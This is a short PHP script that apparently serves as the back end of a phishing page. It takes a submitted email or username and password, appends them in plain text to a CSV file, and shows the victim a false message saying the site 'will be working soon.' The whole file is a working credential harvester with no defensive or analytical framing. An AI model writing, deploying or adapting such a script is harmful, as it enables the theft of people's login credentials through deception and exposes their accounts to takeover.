<?PHP


$username = $_POST['username'];
$password = $_POST['password'];
$info = $username . "," . $password;
$file = "file.csv";

file_put_contents($file, $info . PHP_EOL, FILE_APPEND);

print "Thank you for entering your email and password.</br>The website will be working soon we promise.";





?>